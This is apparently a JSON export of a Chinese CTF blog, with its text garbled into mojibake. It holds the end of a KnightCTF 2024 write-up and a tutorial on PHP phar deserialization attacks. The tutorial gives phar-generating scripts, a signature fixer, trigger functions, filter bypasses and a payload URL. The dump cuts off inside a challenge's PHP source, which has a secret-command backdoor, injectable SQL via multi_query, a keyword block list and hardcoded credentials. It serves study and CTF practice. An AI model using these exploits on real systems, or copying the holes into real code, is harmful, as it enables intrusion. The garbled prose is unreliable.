[\u0026#34;root@knightctf.com\u0026#34;,\u0026#34;attacker@email.com\u0026#34;] } å¯ä»¥çœ‹è§otpå‘è¿‡æ¥äº†ï¼Œç›´æ¥ç™»å½•åå°±è·å–flagäº† Here is your flag: KCTF{AuTh_MIsC0nFigUraTi0N}\n","date":"22 January 2024","externalUrl":null,"permalink":"/posts/knightctf-2024/","section":"Posts","summary":"","title":"Knightctf 2024 WP","type":"posts"},{"content":"","date":"17 January 2024","externalUrl":null,"permalink":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"Tags","summary":"","title":"ååºåˆ—åŒ–","type":"tags"},{"content":"Pharååºåˆ—åŒ– #\rå‚è€ƒæ–‡ç« ï¼š 1ã€#https://aecous.github.io/2023/04/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-phar%E7%AF%87/ 2ã€#https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3r%2BDcAiD9DQqwxvID\u0026amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6699#toc-3 3ã€#https://boogipop.com/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/\n0x01 ä»€ä¹ˆæ˜¯pharï¼Ÿ #\rPharæ˜¯PHPçš„å‹ç¼©æ–‡æ¡£ï¼Œæ˜¯PHPä¸­ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚å®ƒå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å­˜æ”¾è‡³åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ— éœ€è§£å‹ï¼ŒPHPå°±å¯ä»¥è¿›è¡Œè®¿é—®å¹¶æ‰§è¡Œå†…éƒ¨è¯­å¥ã€‚ é»˜è®¤å¼€å¯ç‰ˆæœ¬ PHP version \u0026gt;= 5.3\n0x02å…³äºpharçš„ä¸€äº›çŸ¥è¯† #\rpharçš„æ–‡ä»¶ç»“æ„ #\r1ã€Stub\t//Pharæ–‡ä»¶å¤´ 2ã€manifest\t//å‹ç¼©æ–‡ä»¶ä¿¡æ¯ 3ã€contents\t//å‹ç¼©æ–‡ä»¶å†…å®¹ 4ã€signature\t//ç­¾å Stub #\rstubæ˜¯pharçš„æ–‡ä»¶å¤´ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªå°±æ— æ³•è¢«è¯†åˆ«ä¸ºpharæ–‡ä»¶ï¼ˆä½†æ˜¯ä¸å½±å“ä¼ªé€ æˆå…¶ä»–æ–‡ä»¶ï¼šgifã€pngã€jpg and so onï¼‰\n\u0026lt;?php xxx; __HALT_COMPILER();?\u0026gt; åˆ©ç”¨ä¸€äº›æ„é€ æ‰‹æ³•å¯ä»¥è¿›è¡Œç»•è¿‡\nmanifest ï¼ˆmanifest describing the contentsï¼‰ #\rpharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ã€å¼•ç”¨ã€‘\ncontentsï¼ˆthe file contentsï¼‰ #\rè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚\nsignature([optional] a signature for verifying Phar integrity (phar file format only)) #\rå°±æ˜¯pharæ–‡ä»¶çš„ç­¾åï¼Œæ¯æ¬¡æ–‡ä»¶å†…å®¹æ›´æ”¹çš„æ—¶å€™éƒ½è¦é‡æ–°ç”Ÿæˆæ–°çš„ç­¾å å¯ä»¥çœ‹è§\n20bytes =\u0026gt; SHA1 0x0002 16bytes =\u0026gt; MD5 32bytes =\u0026gt; SHA256 0x0003 64bytes =\u0026gt; SHA512 0x0004 from hashlib import sha1 with open(\u0026#39;test.phar\u0026#39;, \u0026#39;rb\u0026#39;) as file: f = file.read() s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ® h = f[-8:] # è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯† newf = s + sha1(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB) with open(\u0026#39;newtest.phar\u0026#39;, \u0026#39;wb\u0026#39;) as file: file.write(newf) # å†™å…¥æ–°æ–‡ä»¶ demo #\ræ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚\n\u0026lt;?php class DTtest{ } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $o = new DTtest(); $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-\u0026gt;stopBuffering(); ?\u0026gt; å¯ä»¥çœ‹è§ä»–çš„å­˜å‚¨æ–¹å¼ä¹Ÿæ˜¯ä»¥ååºåˆ—åŒ–çš„å½¢å¼å­˜åœ¨çš„\ndemo2 #\r\u0026lt;?php class DTtest { } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $o = new DTtest(); $o-\u0026gt;data=\u0026#39;hello DT!\u0026#39;; $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); ?\u0026gt; å¯ä»¥çœ‹è§è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥ä¼ªé€ äº†ä¸€ä¸ªjpgçš„å¤´æ–‡ä»¶ æµ‹è¯•äº†ä¸€ä¸‹ä¹Ÿæ˜¯å¯ä»¥æ„é€ é“¾å­çš„ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†\n\u0026lt;?php include(\u0026#39;phar://phar.jpg\u0026#39;); class DTtest { function __destruct() { echo $this-\u0026gt;data; echo phpinfo(); } } ?\u0026gt; 0x03è§¦å‘å‡½æ•° #\rä¸ºä»€ä¹ˆ Phar ä¼šååºåˆ—åŒ–å¤„ç†æ–‡ä»¶å¹¶ä¸”åœ¨æ–‡ä»¶æ“ä½œä¸­èƒ½å¤ŸæˆåŠŸååºåˆ—åŒ–å‘¢ï¼Ÿ\nStream API #\rhttps://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548 ï¼Œé‡ç‚¹å…³æ³¨ï¼š\nstream = php_stream_open_wrapper_ex(filename, \u0026#34;rb\u0026#34;, (use_include_path ? USE_PATH : 0) | REPORT_ERRORS, NULL, context); å¯ä»¥æ³¨æ„ï¼Œå…¶ä½¿ç”¨çš„æ˜¯php_streamç³»åˆ—APIæ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ã€‚ å®˜æ–¹æ–‡æ¡£ï¼š https://www.php.net/manual/en/book.stream.php ï¼Œå¯çŸ¥ï¼ŒStream APIæ˜¯PHPä¸­ä¸€ç§ç»Ÿä¸€çš„å¤„ç†æ–‡ä»¶çš„æ–¹æ³•ï¼Œå¹¶ä¸”å…¶è¢«è®¾è®¡ä¸ºå¯æ‰©å±•çš„ï¼Œå…è®¸ä»»æ„æ‰©å±•ä½œè€…ä½¿ç”¨ã€‚è¿™ä¸ªpharå°±æ³¨å†Œäº†phar://è¿™ä¸ªstream wrapperï¼Œå¯ä»¥çœ‹çœ‹æ³¨å†Œäº†ä»€ä¹ˆwrapper\nphp \u0026gt; var_dump(stream_get_wrappers()); array(12) { [0]=\u0026gt; string(5) \u0026#34;https\u0026#34; [1]=\u0026gt; string(4) \u0026#34;ftps\u0026#34; [2]=\u0026gt; string(13) \u0026#34;compress.zlib\u0026#34; [3]=\u0026gt; string(14) \u0026#34;compress.bzip2\u0026#34; [4]=\u0026gt; string(3) \u0026#34;php\u0026#34; [5]=\u0026gt; string(4) \u0026#34;file\u0026#34; [6]=\u0026gt; string(4) \u0026#34;glob\u0026#34; [7]=\u0026gt; string(4) \u0026#34;data\u0026#34; [8]=\u0026gt; string(4) \u0026#34;http\u0026#34; [9]=\u0026gt; string(3) \u0026#34;ftp\u0026#34; [10]=\u0026gt; string(4) \u0026#34;phar\u0026#34; [11]=\u0026gt; string(3) \u0026#34;zip\u0026#34; } æ³¨å†Œwapperå¯ä»¥å®ç°åŠŸèƒ½ï¼Œå…·ä½“çœ‹åº•å±‚ä»£ç ï¼š https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132\ntypedef struct _php_stream_wrapper_ops { /* open/create a wrapped stream */ php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC); /* close/destroy a wrapped stream */ int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream); /* stat a wrapped stream */ int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb); /* stat a URL */ int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context); /* open a \u0026#34;directory\u0026#34; stream */ php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC); const char *label; /* delete a file */ int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context); /* rename a file */ int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context); /* Create/Remove directory */ int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context); int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context); /* Metadata handling */ int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context); } php_stream_wrapper_ops; å¯ä»¥çœ‹è§æ‹¥æœ‰ï¼š stream_opener,stream_closer,stream_stat,url_stat,dir_opener,unlink,rename,stream_mkdir,stream_metadata è¿™å‡ ä¸ªåŠŸèƒ½ 404å®éªŒå®¤seaiiæŒ‡å‡ºäº†æ‰€æœ‰æ–‡ä»¶å‡½æ•°å‡å¯ä½¿ç”¨\nfileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / `fopen`` file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy æ ¹æ®æ–‡ç« çš„åˆ†æï¼Œå¯ä»¥çœ‹è§ï¼Œå…¶åŸç†éƒ½æ˜¯è°ƒç”¨äº† php_stream_locate_url_wrapperè¿™ä¸ªå‡½æ•°ï¼Œéƒ½æ˜¯ç›´æ¥æˆ–è€…é—´æ¥çš„è§¦å‘ååºåˆ—åŒ–çš„wrapperã€‚ æ¥ä¸‹æ¥æ˜¯ä¸€äº›touchæ–‡ä»¶ exif #\rexif_thumbnail exif_imagetype gd #\rimageloadfont imagecreatefrom*** hash #\rhash_hmac_file hash_file hash_update_file md5_file sha1_file file / url #\rget_meta_tags get_headers standard #\rgetimagesize getimagesizefromstring zip #\r$zip = new ZipArchive(); $res = $zip-\u0026gt;open(\u0026#39;c.zip\u0026#39;); $zip-\u0026gt;extractTo(\u0026#39;phar://test.phar/test\u0026#39;); Bzip / Gzip(å¯ç”¨äºbypass phar://çš„æƒ…å†µ) #\rdemo:\n$z = \u0026#39;compress.bzip2://phar:///home/sx/test.phar/test.txt\u0026#39;; å½“ç„¶ï¼Œå®ƒåŒæ ·é€‚ç”¨äºcompress.zlib://ã€‚\npostgres #\r\u0026lt;?php $pdo = new PDO(sprintf(\u0026#34;pgsql:host=%s;dbname=%s;user=%s;password=%s\u0026#34;, \u0026#34;127.0.0.1\u0026#34;, \u0026#34;postgres\u0026#34;, \u0026#34;sx\u0026#34;, \u0026#34;123456\u0026#34;)); @$pdo-\u0026gt;pgsqlCopyFromFile(\u0026#39;aa\u0026#39;, \u0026#39;phar://test.phar/aa\u0026#39;); Mysql #\rMysqlçš„load data local infileä¹Ÿä¼šè§¦å‘php_stream_open_wrapper\n\u0026lt;?php class A { public $s = \u0026#39;\u0026#39;; public function __wakeup () { system($this-\u0026gt;s); } } $m = mysqli_init(); mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true); $s = mysqli_real_connect($m, \u0026#39;localhost\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;easyweb\u0026#39;, 3306); $p = mysqli_query($m, \u0026#39;LOAD DATA LOCAL INFILE \\\u0026#39;phar://test.phar/test\\\u0026#39; INTO TABLE a LINES TERMINATED BY \\\u0026#39;\\r\\n\\\u0026#39; IGNORE 1 LINES;\u0026#39;); 0x04ä¸€äº›bypass #\rå¸¸è§„bypass #\råç¼€åphar ban #\rå½“pharè¿™ä¸ªåç¼€åè¢«bançš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å¯¹åç¼€è¿›è¡Œæ›´æ”¹ï¼Œä¸ä¼šå½±å“åˆ°åè®®çš„è¯»å–ï¼Œå› ä¸ºæ ¹æ®å‰é¢stubæ¥åˆ¤æ–­pharï¼Œä¾‹å¦‚å‰é¢æ„é€ çš„jpgæ¥ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚æ‹¿ä¸Šé¢çš„ä¸¾ä¸ªä¾‹å­ã€‚ stub ban #\rå¦‚æœbanäº†stubå¤´ï¼Œé‚£ä¹ˆå¯ä»¥å°†pharæ–‡ä»¶è¿›è¡Œä¸€æ¬¡å‹ç¼©ï¼Œå»ºè®®ä½¿ç”¨linuxçš„è‡ªå¸¦å‹ç¼©gzipï¼Œä½¿ç”¨windowsçš„bandzipç­‰ä¼šå¯¼è‡´ç®—æ³•é—®é¢˜æ— æ³•è§¦å‘\ngzip 1.zip 1.phar å¦‚æœæ— æ³•ç”¨pharåè®®ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨ä¸‹é¢çš„\ncompress.zlib://phar://phar.phar/test.txt è¿™é‡Œæˆ‘å†™ä¸€ä¸ªä¾‹å­å‡ºæ¥ï¼š demo: a.php\n\u0026lt;?php class DTtest{ } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $o = new DTtest(); $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-\u0026gt;stopBuffering(); ?\u0026gt; phar.php\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $aÂ =Â $_GET[\u0026#39;filename\u0026#39;]; if(substr($a,Â 0,7)Â ==Â \u0026#34;phar://\u0026#34;Â \u0026amp;\u0026amp;Â isset($a)){ die(nonono); }else{ includeÂ $a; } classÂ DTtest{ publicÂ functionÂ __destruct(){ echoÂ $this-\u0026gt;data; echoÂ phpinfo(); } } ?\u0026gt; è¿™é‡Œä¸ºäº†ç®€ä¾¿å°±ä¸å†™å¯¹åç¼€åçš„é™åˆ¶äº†ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œè¿˜æ˜¯ä¸Šä¼ gifæ–‡ä»¶ã€‚ playlaod:http://127.0.0.1/phar.php?filename=compress.zlib://phar://phar.gif åŒæ ·çš„zipåè®®æˆ‘å°±ä¸å†™äº†\nç»•è¿‡__\\wakeup #\rphpç‰ˆæœ¬ PHP5\u0026lt;5.6.25ï¼ŒPHP7 \u0026lt; 7.0.10 åœ¨æ­£å¸¸çš„ååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œéƒ½çŸ¥é“ï¼Œå¯ä»¥é€šè¿‡æ”¹å˜æˆå‘˜æ•°æ¥ç»•è¿‡wakeupï¼ˆï¼‰ï¼ˆå…·ä½“ä¸ºä»€ä¹ˆæˆ‘åé¢å†å»åˆ†æï¼‰ï¼Œæ‰€ä»¥åœ¨pharååºåˆ—åŒ–ä¸­ä¸€æ ·ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºdemo\n\u0026lt;?php class DTtest{ } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $o = new DTtest(); str_replace(\u0026#34;O:6:\u0026#34;DTtest:1\u0026#34;,\u0026#34;O:6:\u0026#34;DTtest\u0026#34;:2,$o); $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-\u0026gt;stopBuffering(); ?\u0026gt; åé¢è‡ªåŠ¨è®¡ç®—ç­¾åå³å¯ å¦å¤–ä¸€ä¸ªæ–¹å¼ï¼ˆå½“phpç‰ˆæœ¬å¯¹åº”ä¸ä¸Šä¸”å«æœ‰__destructæ–¹æ³•çš„æ—¶å€™ï¼‰å¯ä»¥ä½¿ç”¨GCå›æ”¶æœºåˆ¶æ¥ç›´æ¥è§¦å‘é”€æ¯æ–¹æ³•ä»è€Œç»•è¿‡wakeup æˆ–è€…å¯ä»¥åˆ©ç”¨aecouså¸ˆå‚…å†™çš„ï¼š\nfrom hashlib import sha1 file = open(\u0026#39;test.phar\u0026#39;, \u0026#39;rb\u0026#39;).read() # éœ€è¦é‡æ–°ç”Ÿæˆç­¾åçš„pharæ–‡ä»¶ data = file[:-28] # è·å–éœ€è¦ç­¾åçš„æ® final = file[-8:] # è·å–æœ€å8ä½GBMBæ ‡è¯†å’Œç­¾åç±»å‹ newfile = data + sha1(data).digest() + final # æ•°æ® + ç­¾å + ç±»å‹ + GBMB open(\u0026#39;poc.phar\u0026#39;, \u0026#39;wb\u0026#39;).write(newfile) # å†™å…¥åˆ°æ–°çš„pharæ–‡ä»¶ æ¥è¿›è¡Œç»•iè¿‡\nç»•è¿‡å¤´éƒ¨è„æ•°æ® #\rè¿™é‡Œæˆ‘ä¹Ÿå°±ç›´æ¥è´´ä¸Šä¸Šé¢å¸ˆå‚…çš„ä»£ç ä¸‹æ¥äº† å½“æ–‡ä»¶ä¸Šä¼ ä¹‹åï¼Œåœ¨æ–‡ä»¶æ•°æ®å‰é¢æ‹¼æ¥äº†è„æ•°æ®ï¼Œå†è¿›è¡Œæ–‡ä»¶å‡½æ•°é…åˆpharåè®®è¯»å–æ—¶ï¼Œå°±ä¼šå› ä¸ºç­¾ååŸå› å¯¼è‡´æ— æ³•ååºåˆ—åŒ–ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå°±éœ€è¦åœ¨ç”Ÿæˆpharæ–‡ä»¶æ—¶ï¼Œå°†å·²çŸ¥çš„è„æ•°æ®è®¾ç½®åœ¨stubä¸­ï¼Œè®¡ç®—å®Œç­¾ååå°†æ–‡ä»¶ä¸­çš„è„æ•°æ®åˆ é™¤å³å¯\n\u0026lt;?php class A{ } $a=new A(); //å‰é¢çš„è„æ•°æ® $dirtydata = \u0026#34;dirty\u0026#34;; $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //åœ¨stubå¤´ä¸­æ·»åŠ è„æ•°æ® $phar-\u0026gt;setStub($dirtydata.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($a); //æ·»åŠ å‹ç¼©æ–‡ä»¶ $phar-\u0026gt;addFromString(\u0026#34;anything\u0026#34; , \u0026#34;test\u0026#34;); //è‡ªåŠ¨è®¡ç®—ç­¾å $phar-\u0026gt;stopBuffering(); //è¯»å–pharæ–‡ä»¶ $exp = file_get_contents(\u0026#34;./phar.phar\u0026#34;); $post_exp = substr($exp, strlen($dirtydata)); //åˆ é™¤è„æ•°æ®å¤´ $exp = file_put_contents(\u0026#34;./break_phar.phar\u0026#34;,$post_exp); ?\u0026gt; æµ‹è¯•ï¼š\n\u0026lt;?php class A{ public function __destruct() { echo \u0026#34;AAAA\u0026#34;; } } $dirty=\u0026#34;dirty\u0026#34;; $old=file_get_contents(\u0026#34;./phar/break_phar.phar\u0026#34;); $new=$old.$dirty; $new= $dirty.$old; file_put_contents(\u0026#34;./phar/new.phar\u0026#34;,$new); file_get_contents(\u0026#34;phar://./phar/new.phar\u0026#34;); ç»•è¿‡å°¾éƒ¨è„æ•°æ® #\rç»•è¿‡æ–‡ä»¶å°¾éƒ¨çš„è„æ•°æ®å°±ä¸éœ€è¦ä»€ä¹ˆæ“ä½œäº†ï¼Œä¹Ÿä¸éœ€è¦å·²çŸ¥å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨taræ ¼å¼è‡ªåŠ¨å¿½ç•¥ï¼Œå› ä¸ºtaræ ¼å¼æœ‰æš‚åœè§£æä½ï¼Œåœ¨ä¹‹åæ·»åŠ çš„æ•°æ®éƒ½ä¸ä¼šè§£æçš„ã€‚\n\u0026lt;?php class A{ } $a=new A(); //å› ä¸ºç”¨çš„taræ ¼å¼ï¼Œæ‰€ä»¥ä¸éœ€è¦æŒ‡å®šstubå¤´ $phar = new PharData(dirname(__FILE__) . \u0026#34;/phar.tar\u0026#34;, 0, \u0026#34;phartest\u0026#34;, Phar::TAR); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test\u0026#34; , \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); \u0026lt;?php class A{ public function __destruct() { echo \u0026#34;AAAA\u0026#34;; } } $dirty=\u0026#34;dirty\u0026#34;; $old=file_get_contents(\u0026#34;./phar/phar.tar\u0026#34;); $new=$old.$dirty; file_put_contents(\u0026#34;./phar/new.tar\u0026#34;,$new); file_get_contents(\u0026#34;phar://./phar/new.tar\u0026#34;); ç»•è¿‡å‰åè„æ•°æ® #\r\u0026lt;?php class A{ } $a=new A(); //å‰é¢çš„è„æ•°æ® $dirtydata=\u0026#34;dirty\u0026#34;; $phar = new PharData(dirname(__FILE__) . \u0026#34;/phar.tar\u0026#34;, 0, \u0026#34;phartest\u0026#34;, Phar::TAR); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setMetadata($a); //è®¾ç½®å¼€å¤´æ•°æ® $phar-\u0026gt;addFromString($dirtydata , \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); //è¯»å–åŸæ–‡ä»¶ï¼Œæˆªå–ï¼Œåˆ é™¤ $exp = file_get_contents(\u0026#34;./phar.tar\u0026#34;); $post_exp = substr($exp, strlen($dirtydata)); $exp = file_put_contents(\u0026#34;./break_phar.tar\u0026#34;,$post_exp); ?\u0026gt; \u0026lt;?php class A{ public function __destruct() { echo \u0026#34;AAA\u0026#34;; } } $front=\u0026#34;dirty\u0026#34;; $dirty=\u0026#34;dirty\u0026#34;; $old=file_get_contents(\u0026#34;./phar/break_phar.tar\u0026#34;); $new=$front.$old.$dirty; file_put_contents(\u0026#34;./phar/new.tar\u0026#34;,$new); file_get_contents(\u0026#34;phar://./phar/new.tar\u0026#34;); ","date":"17 January 2024","externalUrl":null,"permalink":"/posts/phar/","section":"Posts","summary":"","title":"ååºåˆ—åŒ–-phar","type":"posts"},{"content":"æ²¡æƒ³åˆ°å§ï¼Œåˆæ˜¯lolitaå¸ˆå‚…å‡ºçš„é¢˜ å› ä¸ºå½“æ—¶N1CTFæ²¡è§£å‡ºæ¥ï¼Œæ‰€ä»¥æ‰¾äº†lolitaå¸ˆå‚…å¼€äº†ä¸ªç¯å¢ƒå¤ç°ä¸€ä¸‹ï¼Œåœ¨æ­¤ç‰¹åˆ«æ„Ÿè°¢lolitaå¸ˆå‚…\nè¿›æ¥è¿˜æ˜¯ç›´æ¥load_file()\n\u0026lt;?php //for n1ctf ezmariadb secret cmd if ($_REQUEST[\u0026#34;secret\u0026#34;] === \u0026#34;lolita_love_you_forever\u0026#34;){ header(\u0026#34;Content-Type: text/plain\u0026#34;); echo \u0026#34;\\\\n\\\\n`ps -ef` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ps -ef\u0026#34;); echo \u0026#34;\\\\n\\\\n`ls -l /` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ls -l /\u0026#34;); echo \u0026#34;\\\\n\\\\n`ls -l /var/www/html/` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ls -l /var/www/html/\u0026#34;); echo \u0026#34;\\\\n\\\\n`find /mysql` result\\\\n\\\\n\u0026#34;; system(\u0026#34;find /mysql\u0026#34;); die(\u0026#34;can you get shell?\u0026#34;); } //lolita init db $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;123456\u0026#34;; $dbn = \u0026#34;ctf\u0026#34;; //phpinfo(); //die(); // åˆ›å»ºè¿æ¥ //$conn = new PDO(\u0026#34;mysql:host=$servername;\u0026#34;, $username, $password); //aaa(); $err = \u0026#34;\u0026#34;; try { //$conn = new PDO(\u0026#34;mysql:host=$servername;dbname=$dbn\u0026#34;, $username, $password); $conn = new mysqli($servername, $username, $password, $dbn); //echo \u0026#34;è¿æ¥æˆåŠŸ\u0026#34;; } catch(PDOException $e) { //echo $e-\u0026gt;getMessage(); $conn = null; $err = $e-\u0026gt;getMessage(); } ?\u0026gt; \u0026lt;?php // avoid attack if (preg_match(\u0026#34;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is\u0026#34;, $_REQUEST[\u0026#34;id\u0026#34;])){ die(\u0026#34;ä½ å°±ä¸èƒ½ç»•ä¸€ä¸‹å–µ\u0026#34;); } ?\u0026gt; \u0026lt;?php $cmd = \u0026#34;select name, price from items where id = \u0026#34;.$_REQUEST[\u0026#34;id\u0026#34;]; //$result = $conn-\u0026gt;query($cmd); if ($conn == null) { //die(\u0026#34;è¿æ¥å¤±è´¥: \u0026#34; . $conn-\u0026gt;connect_error); $result = $err; $result = \u0026#34;æ•°æ®åº“åäº†å–µ\\\\n\u0026#34;. $err; }else{ try { $result = $conn-\u0026gt;multi_query($cmd); $result = $conn-\u0026gt;store_result(); while ($conn-\u0026gt;more_results() \u0026amp;\u0026amp; $conn-\u0026gt;next_result()) { //do nothing } if (!$result){ $result = base64_encode(mysqli_error($conn)); }else{ $result = mysqli_fetch_all($result); $result = $result[0]; $result = var_export($result, true); } }catch(Exception $x){ $result = $x-\u0026gt;getMessage(); $result = \u0026#34;æŠ¥é”™äº†å–µ\\\\n\u0026#34; . base64_encode($result); } } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0, shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;title\u0026gt;æ³¨ä¸€ä¸‹è¯•è¯•å‘—~â¤\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic\u0026amp;amp;display=swap\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header class=\u0026#34;text-center text-white masthead\u0026#34; style=\u0026#34;background:url(\\\u0026#39;https://www.dmoe.cc/random.php\\\u0026#39;)no-repeat center center;background-size:cover;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;lolitafont\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Nu1l 